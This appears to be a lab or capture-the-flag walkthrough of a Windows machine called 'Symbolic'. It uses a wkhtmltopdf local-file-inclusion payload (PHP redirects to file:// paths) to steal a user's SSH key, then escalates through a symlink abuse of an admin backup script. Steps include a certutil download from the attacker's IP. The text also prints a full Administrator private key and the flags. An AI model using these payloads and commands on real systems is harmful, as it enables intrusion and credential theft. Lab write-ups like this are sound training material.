@@ -1,0 +1,169 @@
+																			                        Symbolic Walkthrough
+																			
+																								
+Attacker's Machine: 192.168.45.186
+Victim's Machine: 192.168.152.177
+export IP=192.168.250.177
+
+./nmapAutomator.sh -H $IP -t Full
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH for_Windows_7.7 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.48 ((Win64) OpenSSL/1.1.1k PHP/8.0.7)
+|_http-server-header: Apache/2.4.48 (Win64) OpenSSL/1.1.1k PHP/8.0.7
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-title: WebPage to PDF
+
+Enumeration
+Port 80
+
+gobuster dir -u http://$IP:80 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -b 404
+
+/pdfs                 (Status: 301) [Size: 341] [--> http://192.168.152.177/pdfs/]
+/logs                 (Status: 301) [Size: 341] [--> http://192.168.152.177/logs/]
+
+# Aparently, I've only managed to upload .txt file on the server and saw that the wkhtmltopdf version is 0.12.3
+
+
+
+# Searching online, there are already public exploit for LFI targeting all versions under 0.12.3, but, for some reason, if we use our own python server to host .php or .html file in order to execute our commands, we are being stopped by the server. Most likely the server is configured to accept these types of file only from other web servers. 
+   So, let's start our own Apache web Server and host our malicious files.
+ 
+sudo apt install -y apache2 php
+service apache2 start  
+
+# Navigate to your /var/www/html directory and create a php file, either index.php or urs.php containing the following code.
+
+<?php
+header('Location: file:///Windows/win.ini');
+?>
+
+# Once the web server proccesed the file, we saw that we managed to get the contents of win.ini
+
+
+
+# Now that we have confirmed LFI, we know that on the main page we have a hint about a possible user called p4yl0ad
+
+
+
+# Let's try to grab his SSH key with the following code in our urs.php file.
+
+<?php
+header('Location: file:///Users/p4yl0ad/.ssh/id_rsa');
+?>
+
+
+
+# Grab the key and it use to connect with SSH on the machine with the user p4yl0ad
+
+chmod 600 key.txt
+ssh -i key.txt p4yl0ad@$IP
+cd /Desktop
+more local.txt
+db18f3206e18fec5ecc82fd646bfb1e9
+
+
+Privilege Escalation
+
+After we ran winPEAS on the target system, we saw that a backup tool is running on the machine, nssm
+
+
+
+# This gives us a hint that we might have running on the machine a custom script that runs as a service, maybe a backup or some shit?
+   Also, we found that on the C drive, we have a backup folder that contains a ps1 script that makes backups of C:\xampp\htdocs\logs\request.log file every minute and saves it in the C:\backup\logs directory.
+   
+
+
+cd backup
+more backup.ps1
+$log = "C:\xampp\htdocs\logs\request.log"
+$backup = "C:\backup\logs"
+
+while($true) {
+        # Grabbing Backup
+        copy $log $backup\$(get-date -f MM-dd-yyyy_HH_mm_s)
+        Start-Sleep -s 60
+}
+
+# Let's check if we have write permissions on the ps1 script. Aparently not, sadface.
+
+icacls C:\backup\backup.ps1
+C:\backup\backup.ps1 SYMBOLIC\Administrator:(I)(F)
+                     NT AUTHORITY\SYSTEM:(I)(F)
+                     BUILTIN\Administrators:(I)(F)
+                     BUILTIN\Users:(I)(RX)
+
+# Let's check if we have write permissions on C:\xampp\htdocs\logs\request.log
+
+C:\xampp\htdocs\logs\request.log SYMBOLIC\p4yl0ad:(I)(F)
+                                 NT AUTHORITY\SYSTEM:(I)(F)
+                                 BUILTIN\Administrators:(I)(F)
+                                 BUILTIN\Users:(I)(RX)
+
+
+# Let' check who runs the NSSM service
+
+https://github.com/itm4n/PrivescCheck
+
+Import-Module .\PrivescCheck.ps1
+Invoke-PrivescCheck
+
+
+
+# Since we know that NSSM runs as Administrator and that we have full control over the system backups logs from our xamp directory, let's try to create a symbolic link that when the resource "C:\xampp\htdocs\logs\request.log" is referenced or accessed, it will point to "C:\Users\Administrator\.ssh\id_rsa". In this way, when the backup script is execute, it will save a backup file containing the contents of the the id_rsa of the administrator account.
+
+# For this to work, we need to use a tool called CreateSymlink.exe from symboliclink-testing-tools.
+
+Download link: https://github.com/googleprojectzero/symboliclink-testing-tools/releases/download/v1.0/Release.7z
+
+# Unzip the archive and transfer the CreateSymlink.exe  binary to the victims machine.
+
+certutil.exe -urlcache -split -f http://192.168.45.197/CreateSymlink.exe
+
+./CreateSymlink.exe "C:\xampp\htdocs\logs\request.log" "C:\Users\Administrator\.ssh\id_rsa"
+
+
+
+# Leave this windows opened and get a new SSH shell and wait for 1 minute until the next backup takes place. 
+   After the backup read the contents of the last backup, it should contain the SSH private key of the administrator user if it exists on the system.
+   
+   
+   
+more 09-01-2023_02_44_31
+
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
+NhAAAAAwEAAQAAAQEAxxA5qirPy3e1f5k4mL/3P1zBuVAgVPk4AZhptq1oyUsnNC4y0E3e
+AVQvcLFty21pVg8Dd4MBhE1SQqrCGN1pIoWcIPGRlvbDOmGaXFk3ow5IYcu5nkw0L6u2ML
+EO3SomD4bP1Z112FBbYA8KAymItR39M2QPKYXAHF1wNxZlWQjhVEmhKZVCLYubgECimTje
+43EZ6NxELnftirOUhTFAecXIqo9FPyUpXh3ltMqR3mupeBLp7cblubMa5sV1P9v4xjxJRj
+WaL0aAb4OjS67bKG2HEoWWY7JHrjUKCzOpQpHvz7u00MroNa31SHu6XDBraREzZeZ+zdse
+fFcZdflKRwAAA9CAteVYgLXlWAAAAAdzc2gtcnNhAAABAQDHEDmqKs/Ld7V/mTiYv/c/XM
+G5UCBU+TgBmGm2rWjJSyc0LjLQTd4BVC9wsW3LbWlWDwN3gwGETVJCqsIY3WkihZwg8ZGW
+9sM6YZpcWTejDkhhy7meTDQvq7YwsQ7dKiYPhs/VnXXYUFtgDwoDKYi1Hf0zZA8phcAcXX
+A3FmVZCOFUSaEplUIti5uAQKKZON7jcRno3EQud+2Ks5SFMUB5xciqj0U/JSleHeW0ypHe
+a6l4EuntxuW5sxrmxXU/2/jGPElGNZovRoBvg6NLrtsobYcShZZjskeuNQoLM6lCke/Pu7
+TQyug1rfVIe7pcMGtpETNl5n7N2x58Vxl1+UpHAAAAAwEAAQAAAQBXP/hWap9baiPGQq04
+3mMLhadvhvw04ms238vuAsG8ANG1IE6rWIXnBTQp68rY8CLMUpZNasFecNmOWPPsHBe5xu
+Aw3FDY312gmCklMwGc2WTGYJoCFRqGjnezjdea/p9iDM/JrFN7tXTnfJAB5NGDuRpCzSeM
+JpCWninSK2HOjLygldNiJCjmFhl5YJ2IU1GjSMDtNUo3VavCcrQ+FxB+L2eG7FHiHo3+Be
+McSGCOLBf1YokbXV88Se9ofnJyi+Ddsg9+v4vQfSZ958m/gSAoqxkg0KtWR45lpMpSN03k
+Hx8mb3jQTJhuT07GRXiZIJ5RVmO0f6wNH6KzACnD7J9ZAAAAgQCvUJUJwYSUvI0rNSXQMz
+tieT0IZq7oFiQISKjfAED0zLWm3s9ML8BZ3ArWomZinsHont1Pr1Q0nXhLB/UEqECMpkDf
+Rnr+MssfPXMh/BHmsIcAzqT0MoG1NIeF3dRWQbo4ZmxDZQ3YJhfrstVzmho9qZWx2ZXyPs
+sA7HCDqBV1CQAAAIEA754ugprmrQCFcR2DqV52ejK1MARGxYlNq980hUplnlV1oE2hrbzs
+AJ2dDHXRnllAAWJDQtJvYlj3w9C7p4bXKnczXXAKwa0MCtyz1h0TGyn63k8L0+BxKXnOET
+NDHrBJ06pBdJpf5TCX0Uz4siCTOibDVol2gZbQkFkDLtV/y/MAAACBANSsQQgd8rBIxsBB
+lZnID93TvwWniL8i7v/IHiuALGMGLqaXTb8FYPNhlOZPQmpE3SzstosCAmf+dypTYa1qm3
+PK16UBRBIkltnlfuRDBKqLWtI5MoPhArWelEyd/xpLAvMcMcsS8bh2TJe8jfo1dC8TcCNm
+va4M+FKZegkfjsFdAAAAFmFkbWluaXN0cmF0b3JAU1lNQk9MSUMBAgME
+-----END OPENSSH PRIVATE KEY-----
+
+# Now, that we've got the key, let's login on SSH as administrator
+
+chmod 600 key
+ssh -i key Administrator@$IP
+cd C:\Users\Administrator\Desktop
+more proof.txt
+a5dc6485c29d1052860e7a94ab339fcd
